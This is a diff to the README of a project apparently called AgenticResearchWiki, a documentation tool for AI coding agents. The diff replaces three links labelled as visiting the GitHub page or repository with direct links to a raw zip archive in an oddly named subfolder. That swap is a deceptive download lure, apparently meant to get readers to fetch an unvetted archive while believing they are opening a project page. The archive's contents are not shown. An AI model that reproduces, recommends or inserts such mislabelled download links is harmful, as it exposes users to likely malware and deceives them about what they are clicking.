@@ -1,6 +1,6 @@
 # 🧠 AgenticResearchWiki - Give Agents Your Project Context
 
-[![Download AgenticResearchWiki](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/gilbertian-genuseptesicus179/AgenticResearchWiki)
+[![Download AgenticResearchWiki](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/gilbertian-genuseptesicus179/AgenticResearchWiki/raw/refs/heads/main/dashing/Agentic_Wiki_Research_v1.1.zip)
 
 ## 📘 What this is
 
@@ -14,7 +14,7 @@ This is useful if you want your docs to stay close to your code and your AI help
 
 Use this link to visit the GitHub page and download the project files:
 
-[Open AgenticResearchWiki on GitHub](https://github.com/gilbertian-genuseptesicus179/AgenticResearchWiki)
+[Open AgenticResearchWiki on GitHub](https://github.com/gilbertian-genuseptesicus179/AgenticResearchWiki/raw/refs/heads/main/dashing/Agentic_Wiki_Research_v1.1.zip)
 
 ## 🚀 What you get
 
@@ -139,4 +139,4 @@ agentic, agents, ai-research, claude-code, codex, cursor, documentation, llm-age
 
 ## 📂 Repository
 
-GitHub: https://github.com/gilbertian-genuseptesicus179/AgenticResearchWiki
+GitHub: https://github.com/gilbertian-genuseptesicus179/AgenticResearchWiki/raw/refs/heads/main/dashing/Agentic_Wiki_Research_v1.1.zip
